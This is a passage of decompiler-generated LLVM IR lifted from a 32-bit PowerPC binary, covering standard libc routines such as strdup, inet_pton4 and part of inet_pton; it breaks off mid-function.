  %v0_10014898 = phi i32 [ 0, %entry ], [ %v1_1001487c, %dec_label_pc_1001487c ], [ %v0_1001487c, %dec_label_pc_10014874 ]
  ret i32 %v0_10014898

; uselistorder directives
  uselistorder i32 %v0_10014860, { 1, 0 }
  uselistorder label %dec_label_pc_10014890, { 1, 0 }
  uselistorder label %dec_label_pc_10014860, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_100148b4 = call i32 @__GI_strlen()
  %v1_100148b8 = add i32 %v0_100148b4, 1
  store i32 %v1_100148b8, i32* @r29, align 4
  store i32 268519620, i32* @lr, align 4
  %v1_100148c0 = call i32 @malloc(i32 %v1_100148b8)
  store i32 %v1_100148c0, i32* @r3, align 4
  %v0_100148c4 = load i32, i32* @r28, align 4
  store i32 %v0_100148c4, i32* @r4, align 4
  store i32 %v1_100148c0, i32* @r31, align 4
  %v3_100148c8 = icmp eq i32 %v1_100148c0, 0
  %v0_100148cc = load i32, i32* @r29, align 4
  store i32 %v0_100148cc, i32* @r5, align 4
  br i1 %v3_100148c8, label %dec_label_pc_100148d8, label %dec_label_pc_100148d4

dec_label_pc_100148d4:                            ; preds = %entry
  store i32 268519640, i32* @lr, align 4
  %v0_100148d4 = call i32 @memcpy()
  %v0_100148dc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100148d8

dec_label_pc_100148d8:                            ; preds = %entry, %dec_label_pc_100148d4
  %v0_100148dc = phi i32 [ 0, %entry ], [ %v0_100148dc.pre, %dec_label_pc_100148d4 ]
  ret i32 %v0_100148dc

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 6, 5, 4, 3, 2, 14, 13, 12, 11, 10, 9, 8, 7, 1, 0 }
  uselistorder label %dec_label_pc_100148d8, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100148f0 = load i32, i32* @lr, align 4
  store i32 %v0_100148f0, i32* %r0.global-to-local, align 4
  %v0_100148f8 = call i32 @__asm_mfcr()
  store i32 %v0_100148f8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_10014904 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10014904, i32* %r7.global-to-local, align 4
  %v0_10014908 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10014970

dec_label_pc_10014920:                            ; preds = %dec_label_pc_10014970
  %v3_10014920 = icmp eq i32 %v0_10014994, 4
  store i1 %v3_10014920, i1* %cr7_eq.global-to-local, align 1
  %v0_10014924 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10014924, label %dec_label_pc_1001495c, label %dec_label_pc_10014928

dec_label_pc_10014928:                            ; preds = %dec_label_pc_10014920
  %v0_10014928 = load i32, i32* %r7.global-to-local, align 4
  %v1_10014928 = inttoptr i32 %v0_10014928 to i8*
  %v2_10014928 = load i8, i8* %v1_10014928, align 1
  %v3_10014928 = zext i8 %v2_10014928 to i32
  %v1_1001492c = mul nuw nsw i32 %v3_10014928, 10
  %v1_10014930 = load i32, i32* %r11.global-to-local, align 4
  %v2_10014930 = add i32 %v1_1001492c, %v1_10014930
  %v1_10014934 = add i32 %v2_10014930, -48
  store i32 %v1_10014934, i32* %r0.global-to-local, align 4
  %v2_10014938 = icmp ugt i32 %v1_10014934, 255
  %v3_10014938 = icmp eq i32 %v1_10014934, 255
  store i1 %v3_10014938, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014938, label %dec_label_pc_100149b8, label %dec_label_pc_10014940

dec_label_pc_10014940:                            ; preds = %dec_label_pc_10014928
  %v1_10014940 = trunc i32 %v1_10014934 to i8
  store i8 %v1_10014940, i8* %v1_10014928, align 1
  %v0_10014944 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10014944, label %dec_label_pc_10014948, label %dec_label_pc_10014970.backedge

dec_label_pc_10014948:                            ; preds = %dec_label_pc_10014940
  %v0_10014948 = load i32, i32* %r10.global-to-local, align 4
  %v1_10014948 = add i32 %v0_10014948, 1
  store i32 %v1_10014948, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_10014950 = icmp sgt i32 %v1_10014948, 4
  %v3_10014950 = icmp eq i32 %v1_10014948, 4
  store i1 %v3_10014950, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014950, label %dec_label_pc_100149b8, label %dec_label_pc_10014970.backedge

dec_label_pc_1001495c:                            ; preds = %dec_label_pc_10014920
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_10014960 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_10014960.not = xor i1 %v0_10014960, true
  %v0_10014964 = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10014920, %v0_10014964
  %or.cond = or i1 %brmerge, %v0_10014960.not
  br i1 %or.cond, label %dec_label_pc_100149b8, label %dec_label_pc_1001496c

dec_label_pc_1001496c:                            ; preds = %dec_label_pc_1001495c
  %v0_1001496c = load i32, i32* %r6.global-to-local, align 4
  %v1_1001496c = trunc i32 %v0_1001496c to i8
  %v2_1001496c = load i32, i32* %r7.global-to-local, align 4
  %v3_1001496c = add i32 %v2_1001496c, 1
  %v4_1001496c = inttoptr i32 %v3_1001496c to i8*
  store i8 %v1_1001496c, i8* %v4_1001496c, align 1
  store i32 %v3_1001496c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10014970.backedge

dec_label_pc_10014970.backedge:                   ; preds = %dec_label_pc_1001496c, %dec_label_pc_10014940, %dec_label_pc_10014948
  %v0_10014970.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10014974.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10014970

dec_label_pc_10014970:                            ; preds = %dec_label_pc_10014970.backedge, %entry
  %v0_10014974 = phi i32 [ %v0_10014974.pre, %dec_label_pc_10014970.backedge ], [ 0, %entry ]
  %v0_10014978 = phi i32 [ %v0_10014970.pre, %dec_label_pc_10014970.backedge ], [ %v0_100148f8, %entry ]
  %v1_10014970 = inttoptr i32 %v0_10014978 to i8*
  %v2_10014970 = load i8, i8* %v1_10014970, align 1
  %v3_10014970 = zext i8 %v2_10014970 to i32
  store i32 %v3_10014970, i32* %r11.global-to-local, align 4
  %v3_10014974 = icmp eq i32 %v0_10014974, 0
  store i1 %v3_10014974, i1* %cr4_eq.global-to-local, align 1
  %v1_10014978 = add i32 %v0_10014978, 1
  store i32 %v1_10014978, i32* %r3.global-to-local, align 4
  %v3_1001497c = icmp eq i8 %v2_10014970, 0
  store i1 %v3_1001497c, i1* %cr7_eq.global-to-local, align 1
  %v1_10014980 = add nsw i32 %v3_10014970, -48
  store i32 %v1_10014980, i32* %r0.global-to-local, align 4
  %v2_10014984 = icmp ugt i32 %v1_10014980, 9
  store i1 %v2_10014984, i1* %cr6_gt.global-to-local, align 1
  %v3_10014988 = icmp eq i8 %v2_10014970, 46
  store i1 %v3_10014988, i1* %cr1_eq.global-to-local, align 1
  %v0_1001498c = load i4, i4* @cr4, align 1
  %v1_1001498c = call %2 @__asm_mcrf_cr0_write(i4 %v0_1001498c)
  %v4_1001498c = extractvalue %2 %v1_1001498c, 2
  store i1 %v4_1001498c, i1* %cr0_eq.global-to-local, align 1
  %v0_10014990 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_10014994 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_10014990, label %dec_label_pc_10014994, label %dec_label_pc_10014920

dec_label_pc_10014994:                            ; preds = %dec_label_pc_10014970
  %v3_10014994 = icmp eq i32 %v0_10014994, 3
  store i1 %v3_10014994, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_10014994, 4
  br i1 %tmp9, label %dec_label_pc_100149b8, label %dec_label_pc_1001499c

dec_label_pc_1001499c:                            ; preds = %dec_label_pc_10014994
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_10014904, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100149ac.717 to i32), i32* @lr, align 4
  %v0_100149a8 = call i32 @memcpy()
  br label %dec_label_pc_100149b8

dec_label_pc_100149b8:                            ; preds = %dec_label_pc_1001495c, %dec_label_pc_10014928, %dec_label_pc_10014948, %dec_label_pc_10014994, %dec_label_pc_1001499c
  %storemerge = phi i32 [ 1, %dec_label_pc_1001499c ], [ 0, %dec_label_pc_10014994 ], [ 0, %dec_label_pc_10014948 ], [ 0, %dec_label_pc_10014928 ], [ 0, %dec_label_pc_1001495c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_10014908, i32* %r0.global-to-local, align 4
  %v1_100149c8 = call %1 @__asm_mtcrf(i32 8, i32 %v0_100148f8)
  %v4_100149c8 = extractvalue %1 %v1_100149c8, 2
  store i1 %v4_100149c8, i1* %cr0_eq.global-to-local, align 1
  %v9_100149c8 = extractvalue %1 %v1_100149c8, 7
  store i4 %v9_100149c8, i4* @cr4, align 1
  %v0_100149cc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100149cc

; uselistorder directives
  uselistorder i32 %v1_10014948, { 1, 0, 2 }
  uselistorder i32 %v1_10014934, { 0, 2, 1, 3 }
  uselistorder i32 %v0_100148f8, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 7, 8, 9, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_100149b8, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10014970.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_100149d0 = icmp eq i32 %arg1, 2
  %v0_100149d4 = load i32, i32* @lr, align 4
  store i32 %v0_100149d4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_100149d0, label %dec_label_pc_100149fc, label %dec_label_pc_100149f0

dec_label_pc_100149f0:                            ; preds = %entry
  %v3_100149f0 = icmp eq i32 %arg1, 10
  br i1 %v3_100149f0, label %dec_label_pc_10014a10, label %dec_label_pc_10014bac

dec_label_pc_100149fc:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268519944, i32* @lr, align 4
  %v3_10014a04 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_10014a04, i32* %r3.global-to-local, align 4
  store i32 %v3_10014a04, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014bc4

dec_label_pc_10014a10:                            ; preds = %dec_label_pc_100149f0
  %v2_10014a10 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10014a10, i32* %r3.global-to-local, align 4
  store i32 268519968, i32* @lr, align 4
  %v3_10014a1c = call i32 @__GI_memset(i32 %v2_10014a10, i32 0, i32 16)
  store i32 %v3_10014a1c, i32* %r3.global-to-local, align 4
  %v0_10014a20 = load i32, i32* @r29, align 4
  %v1_10014a20 = inttoptr i32 %v0_10014a20 to i8*
  %v2_10014a20 = load i8, i8* %v1_10014a20, align 1
  %v3_10014a20 = zext i8 %v2_10014a20 to i32
  store i32 %v3_10014a20, i32* %r0.global-to-local, align 4
  store i32 %v3_10014a1c, i32* @r31, align 4
  %v2_10014a28 = add i32 %v3_10014a1c, 16
  store i32 %v2_10014a28, i32* @r27, align 4
  %v3_10014a2c = icmp eq i8 %v2_10014a20, 58
  br i1 %v3_10014a2c, label %dec_label_pc_10014a34, label %dec_label_pc_10014a40

dec_label_pc_10014a34:                            ; preds = %dec_label_pc_10014a10
  %v1_10014a34 = add i32 %v0_10014a20, 1
  %v2_10014a34 = inttoptr i32 %v1_10014a34 to i8*
  %v3_10014a34 = load i8, i8* %v2_10014a34, align 1
  %v4_10014a34 = zext i8 %v3_10014a34 to i32
  store i32 %v4_10014a34, i32* %r0.global-to-local, align 4
  store i32 %v1_10014a34, i32* @r29, align 4
  %v3_10014a38 = icmp eq i8 %v3_10014a34, 58
  br i1 %v3_10014a38, label %dec_label_pc_10014a40, label %dec_label_pc_10014bc0

dec_label_pc_10014a40:                            ; preds = %dec_label_pc_10014a34, %dec_label_pc_10014a10
  %v0_10014a40 = phi i32 [ %v1_10014a34, %dec_label_pc_10014a34 ], [ %v0_10014a20, %dec_label_pc_10014a10 ]
  store i32 %v0_10014a40, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_10014b143036 = inttoptr i32 %v0_10014a40 to i8*
  %v2_10014b143137 = load i8, i8* %v1_10014b143036, align 1
  %v3_10014b143238 = zext i8 %v2_10014b143137 to i32
  store i32 %v3_10014b143238, i32* %r3.global-to-local, align 4
  store i32 268520220, i32* @lr, align 4
  %v1_10014b183339 = call i32 @__GI_tolower(i32 %v3_10014b143238)
  store i32 %v1_10014b183339, i32* %r3.global-to-local, align 4
  store i32 %v1_10014b183339, i32* @r30, align 4
  %v3_10014b1c3440 = icmp eq i32 %v1_10014b183339, 0
  br i1 %v3_10014b1c3440, label %dec_label_pc_10014b24, label %dec_label_pc_10014a4c.lr.ph

dec_label_pc_10014a4c:                            ; preds = %dec_label_pc_10014a4c.lr.ph, %dec_label_pc_10014b14.backedge
  %v1_10014b1835 = phi i32 [ %v1_10014b183341, %dec_label_pc_10014a4c.lr.ph ], [ %v1_10014b18, %dec_label_pc_10014b14.backedge ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001a660.718 to i32), i32* @r25, align 4
  %v0_10014a58 = load i32, i32* @r29, align 4
  %v1_10014a58 = add i32 %v0_10014a58, 1
  store i32 %v1_10014a58, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001a660.718 to i32), i32* @r3, align 4
  store i32 268520036, i32* @lr, align 4
  %v3_10014a60 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1001a660.718 to i32), i32 %v1_10014b1835)
  store i32 %v3_10014a60, i32* %r3.global-to-local, align 4
  %v3_10014a64 = icmp eq i32 %v3_10014a60, 0
  br i1 %v3_10014a64, label %dec_label_pc_10014a84, label %dec_label_pc_10014a6c

dec_label_pc_10014a6c:                            ; preds = %dec_label_pc_10014a4c
  %v0_10014a6c = load i32, i32* @r25, align 4
  %v2_10014a6c = sub i32 %v3_10014a60, %v0_10014a6c
  store i32 %v2_10014a6c, i32* %r0.global-to-local, align 4
  %v0_10014a70 = load i32, i32* @r28, align 4
  %v1_10014a70 = mul i32 %v0_10014a70, 16
  store i32 %v1_10014a70, i32* %r9.global-to-local, align 4
  %v2_10014a74 = or i32 %v1_10014a70, %v2_10014a6c
  store i32 %v2_10014a74, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_10014a74, 65536
  br i1 %tmp19, label %dec_label_pc_10014b10, label %dec_label_pc_10014bc0

dec_label_pc_10014a84:                            ; preds = %dec_label_pc_10014a4c
  %v0_10014a84 = load i32, i32* @r30, align 4
  %v3_10014a84 = icmp eq i32 %v0_10014a84, 58
  br i1 %v3_10014a84, label %dec_label_pc_10014a8c, label %dec_label_pc_10014ae0

dec_label_pc_10014a8c:                            ; preds = %dec_label_pc_10014a84
  %v0_10014a8c = load i32, i32* @r23, align 4
  %v3_10014a8c = icmp eq i32 %v0_10014a8c, 0
  br i1 %v3_10014a8c, label %dec_label_pc_10014a94, label %dec_label_pc_10014aa8

dec_label_pc_10014a94:                            ; preds = %dec_label_pc_10014a8c
  %v0_10014a94 = load i32, i32* @r24, align 4
  %v3_10014a94 = icmp eq i32 %v0_10014a94, 0
  br i1 %v3_10014a94, label %dec_label_pc_10014a9c, label %dec_label_pc_10014bc0

dec_label_pc_10014a9c:                            ; preds = %dec_label_pc_10014a94
  %v0_10014a9c = load i32, i32* @r31, align 4
  store i32 %v0_10014a9c, i32* @r24, align 4
  %v0_10014aa0 = load i32, i32* @r29, align 4
  store i32 %v0_10014aa0, i32* @r26, align 4
  br label %dec_label_pc_10014b14.backedge

dec_label_pc_10014aa8:                            ; preds = %dec_label_pc_10014a8c
  %v0_10014aa8 = load i32, i32* @r29, align 4
  %v1_10014aa8 = inttoptr i32 %v0_10014aa8 to i8*
  %v2_10014aa8 = load i8, i8* %v1_10014aa8, align 1
  %v3_10014aa8 = zext i8 %v2_10014aa8 to i32
  store i32 %v3_10014aa8, i32* %r0.global-to-local, align 4
  %v3_10014aac = icmp eq i8 %v2_10014aa8, 0
  br i1 %v3_10014aac, label %dec_label_pc_10014bc0, label %dec_label_pc_10014ab4

dec_label_pc_10014ab4:                            ; preds = %dec_label_pc_10014aa8
  %v0_10014ab4 = load i32, i32* @r31, align 4
  %v1_10014ab4 = add i32 %v0_10014ab4, 2
  store i32 %v1_10014ab4, i32* %r0.global-to-local, align 4
  %v1_10014ab8 = load i32, i32* @r27, align 4
  %v3_10014ab8 = icmp ugt i32 %v1_10014ab4, %v1_10014ab8
  br i1 %v3_10014ab8, label %dec_label_pc_10014bc0, label %dec_label_pc_10014ac0

dec_label_pc_10014ac0:                            ; preds = %dec_label_pc_10014ab4
  %v0_10014ac0 = load i32, i32* @r28, align 4
  %v1_10014ac0 = udiv i32 %v0_10014ac0, 256
  store i32 %v1_10014ac0, i32* %r0.global-to-local, align 4
  %v1_10014ac4 = trunc i32 %v0_10014ac0 to i8
  %v3_10014ac4 = add i32 %v0_10014ab4, 1
  %v4_10014ac4 = inttoptr i32 %v3_10014ac4 to i8*
  store i8 %v1_10014ac4, i8* %v4_10014ac4, align 1
  %v0_10014ac8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014ac8 = trunc i32 %v0_10014ac8 to i8
  %v2_10014ac8 = load i32, i32* @r31, align 4
  %v3_10014ac8 = inttoptr i32 %v2_10014ac8 to i8*
  store i8 %v1_10014ac8, i8* %v3_10014ac8, align 1
  %v0_10014acc = load i32, i32* @r29, align 4
  store i32 %v0_10014acc, i32* @r26, align 4
  %v0_10014ad0 = load i32, i32* @r31, align 4
  %v1_10014ad0 = add i32 %v0_10014ad0, 2
  store i32 %v1_10014ad0, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_10014b1430 = inttoptr i32 %v0_10014acc to i8*
  %v2_10014b1431 = load i8, i8* %v1_10014b1430, align 1
  %v3_10014b1432 = zext i8 %v2_10014b1431 to i32
  store i32 %v3_10014b1432, i32* %r3.global-to-local, align 4
  store i32 268520220, i32* @lr, align 4
  %v1_10014b1833 = call i32 @__GI_tolower(i32 %v3_10014b1432)
  store i32 %v1_10014b1833, i32* %r3.global-to-local, align 4
  store i32 %v1_10014b1833, i32* @r30, align 4
  %v3_10014b1c34 = icmp eq i32 %v1_10014b1833, 0
  br i1 %v3_10014b1c34, label %dec_label_pc_10014b24, label %dec_label_pc_10014a4c.lr.ph

dec_label_pc_10014a4c.lr.ph:                      ; preds = %dec_label_pc_10014a40, %dec_label_pc_10014ac0
  %v1_10014b183341 = phi i32 [ %v1_10014b1833, %dec_label_pc_10014ac0 ], [ %v1_10014b183339, %dec_label_pc_10014a40 ]
  br label %dec_label_pc_10014a4c

dec_label_pc_10014ae0:                            ; preds = %dec_label_pc_10014a84
  %v3_10014ae0 = icmp eq i32 %v0_10014a84, 46
  br i1 %v3_10014ae0, label %dec_label_pc_10014ae8, label %dec_label_pc_10014bc0

dec_label_pc_10014ae8:                            ; preds = %dec_label_pc_10014ae0
  %v0_10014ae8 = load i32, i32* @r31, align 4
  %v1_10014ae8 = add i32 %v0_10014ae8, 4
  store i32 %v1_10014ae8, i32* @r30, align 4
  %v1_10014aec = load i32, i32* @r27, align 4
  %v3_10014aec = icmp ugt i32 %v1_10014ae8, %v1_10014aec
  br i1 %v3_10014aec, label %dec_label_pc_10014bc0, label %dec_label_pc_10014af4

dec_label_pc_10014af4:                            ; preds = %dec_label_pc_10014ae8
  %v0_10014af8 = load i32, i32* @r26, align 4
  store i32 %v0_10014af8, i32* %r3.global-to-local, align 4
  store i32 268520192, i32* @lr, align 4
  %v3_10014afc = call i32 @inet_pton4(i32 %v0_10014af8, i32 %v0_10014ae8)
  store i32 %v3_10014afc, i32* %r3.global-to-local, align 4
  %v0_10014b00 = load i32, i32* @r30, align 4
  store i32 %v0_10014b00, i32* @r31, align 4
  %v2_10014b04 = icmp sgt i32 %v3_10014afc, 0
  br i1 %v2_10014b04, label %dec_label_pc_10014b48, label %dec_label_pc_10014bc0

dec_label_pc_10014b10:                            ; preds = %dec_label_pc_10014a6c
  store i32 1, i32* @r23, align 4
  %v0_10014b14.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10014b14.backedge

dec_label_pc_10014b14.backedge:                   ; preds = %dec_label_pc_10014b10, %dec_label_pc_10014a9c
  %v0_10014b14.be = phi i32 [ %v0_10014b14.pre.pre, %dec_label_pc_10014b10 ], [ %v0_10014aa0, %dec_label_pc_10014a9c ]
  %v1_10014b14 = inttoptr i32 %v0_10014b14.be to i8*
  %v2_10014b14 = load i8, i8* %v1_10014b14, align 1
  %v3_10014b14 = zext i8 %v2_10014b14 to i32
  store i32 %v3_10014b14, i32* %r3.global-to-local, align 4
  store i32 268520220, i32* @lr, align 4
  %v1_10014b18 = call i32 @__GI_tolower(i32 %v3_10014b14)
  store i32 %v1_10014b18, i32* %r3.global-to-local, align 4
  store i32 %v1_10014b18, i32* @r30, align 4
  %v3_10014b1c = icmp eq i32 %v1_10014b18, 0
  br i1 %v3_10014b1c, label %dec_label_pc_10014b24, label %dec_label_pc_10014a4c

dec_label_pc_10014b24:                            ; preds = %dec_label_pc_10014b14.backedge, %dec_label_pc_10014a40, %dec_label_pc_10014ac0
  %v0_10014b24 = load i32, i32* @r23, align 4
  %v3_10014b24 = icmp eq i32 %v0_10014b24, 0
  %v0_10014b8c.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_10014b24, label %dec_label_pc_10014b48, label %dec_label_pc_10014b2c

dec_label_pc_10014b2c:                            ; preds = %dec_label_pc_10014b24
  %v1_10014b2c = add i32 %v0_10014b8c.pre.pre, 2
  store i32 %v1_10014b2c, i32* %r0.global-to-local, align 4
  %v1_10014b30 = load i32, i32* @r27, align 4
  %v3_10014b30 = icmp ugt i32 %v1_10014b2c, %v1_10014b30
  br i1 %v3_10014b30, label %dec_label_pc_10014bc0, label %dec_label_pc_10014b38

dec_label_pc_10014b38:                            ; preds = %dec_label_pc_10014b2c
  %v0_10014b38 = load i32, i32* @r28, align 4
  %v1_10014b38 = udiv i32 %v0_10014b38, 256
  store i32 %v1_10014b38, i32* %r0.global-to-local, align 4
  %v1_10014b3c = trunc i32 %v0_10014b38 to i8
  %v3_10014b3c = add i32 %v0_10014b8c.pre.pre, 1
  %v4_10014b3c = inttoptr i32 %v3_10014b3c to i8*
  store i8 %v1_10014b3c, i8* %v4_10014b3c, align 1
  %v0_10014b40 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014b40 = trunc i32 %v0_10014b40 to i8
  %v2_10014b40 = load i32, i32* @r31, align 4
  %v3_10014b40 = inttoptr i32 %v2_10014b40 to i8*
  store i8 %v1_10014b40, i8* %v3_10014b40, align 1
  %v0_10014b44 = load i32, i32* @r31, align 4
  %v1_10014b44 = add i32 %v0_10014b44, 2
  store i32 %v1_10014b44, i32* @r31, align 4
  br label %dec_label_pc_10014b48

dec_label_pc_10014b48:                            ; preds = %dec_label_pc_10014b24, %dec_label_pc_10014af4, %dec_label_pc_10014b38
  %v0_10014b8c.pre = phi i32 [ %v0_10014b00, %dec_label_pc_10014af4 ], [ %v1_10014b44, %dec_label_pc_10014b38 ], [ %v0_10014b8c.pre.pre, %dec_label_pc_10014b24 ]
  %v0_10014b48 = load i32, i32* @r24, align 4
  %v3_10014b48 = icmp eq i32 %v0_10014b48, 0
  %v1_10014b8c.pre = load i32, i32* @r27, align 4
  %v4_10014b8c = icmp eq i32 %v0_10014b8c.pre, %v1_10014b8c.pre
  br i1 %v3_10014b48, label %dec_label_pc_10014b8c, label %dec_label_pc_10014b50

dec_label_pc_10014b50:                            ; preds = %dec_label_pc_10014b48
  %v2_10014b54 = sub i32 %v0_10014b8c.pre, %v0_10014b48
  store i32 %v2_10014b54, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_10014b8c, label %dec_label_pc_10014bc0, label %dec_label_pc_10014b74.preheader

dec_label_pc_10014b74.preheader:                  ; preds = %dec_label_pc_10014b50
  %v3_10014b7424 = icmp slt i32 %v2_10014b54, 1
  %v2_10014b7826 = add i32 %v2_10014b54, -1
  store i32 %v2_10014b7826, i32* %r10.global-to-local, align 4
  %v2_10014b7c27 = add i32 %v1_10014b8c.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_10014b7424, label %dec_label_pc_10014b8c.thread, label %dec_label_pc_10014b68

dec_label_pc_10014b68:                            ; preds = %dec_label_pc_10014b74.preheader, %dec_label_pc_10014b68.dec_label_pc_10014b68_crit_edge
  %v0_10014b68 = phi i32 [ %v0_10014b68.pre, %dec_label_pc_10014b68.dec_label_pc_10014b68_crit_edge ], [ %v0_10014b48, %dec_label_pc_10014b74.preheader ]
  %v2_10014b7c29 = phi i32 [ %v2_10014b7c, %dec_label_pc_10014b68.dec_label_pc_10014b68_crit_edge ], [ %v2_10014b7c27, %dec_label_pc_10014b74.preheader ]
  %v2_10014b7828 = phi i32 [ %v2_10014b78, %dec_label_pc_10014b68.dec_label_pc_10014b68_crit_edge ], [ %v2_10014b7826, %dec_label_pc_10014b74.preheader ]
  %v2_10014b68 = add i32 %v0_10014b68, %v2_10014b7828
  %v3_10014b68 = inttoptr i32 %v2_10014b68 to i8*
  %v4_10014b68 = load i8, i8* %v3_10014b68, align 1
  %v5_10014b68 = zext i8 %v4_10014b68 to i32
  store i32 %v5_10014b68, i32* %r0.global-to-local, align 4
  %v3_10014b6c = inttoptr i32 %v2_10014b7c29 to i8*
  store i8 %v4_10014b68, i8* %v3_10014b6c, align 1
  %v0_10014b70 = load i32, i32* %r8.global-to-local, align 4
  %v1_10014b70 = load i32, i32* @r24, align 4
  %v2_10014b70 = load i32, i32* %r10.global-to-local, align 4
  %v3_10014b70 = trunc i32 %v0_10014b70 to i8
  %v4_10014b70 = add i32 %v2_10014b70, %v1_10014b70
  %v5_10014b70 = inttoptr i32 %v4_10014b70 to i8*
  store i8 %v3_10014b70, i8* %v5_10014b70, align 1
  %v0_10014b74.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10014b74.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10014b7c.pre = load i32, i32* @r27, align 4
  %v3_10014b74 = icmp slt i32 %v1_10014b74.pre, %v0_10014b74.pre
  %v2_10014b78 = sub i32 %v1_10014b74.pre, %v0_10014b74.pre
  store i32 %v2_10014b78, i32* %r10.global-to-local, align 4
  %v1_10014b80 = add i32 %v0_10014b74.pre, 1
  store i32 %v1_10014b80, i32* %r9.global-to-local, align 4
  br i1 %v3_10014b74, label %dec_label_pc_10014b8c.thread, label %dec_label_pc_10014b68.dec_label_pc_10014b68_crit_edge

dec_label_pc_10014b68.dec_label_pc_10014b68_crit_edge: ; preds = %dec_label_pc_10014b68
  %v2_10014b7c = sub i32 %v1_10014b7c.pre, %v0_10014b74.pre
  %v0_10014b68.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_10014b68

dec_label_pc_10014b8c.thread:                     ; preds = %dec_label_pc_10014b68, %dec_label_pc_10014b74.preheader
  %v0_10014b88.lcssa = phi i32 [ %v1_10014b8c.pre, %dec_label_pc_10014b74.preheader ], [ %v1_10014b7c.pre, %dec_label_pc_10014b68 ]
  store i32 %v0_10014b88.lcssa, i32* @r31, align 4
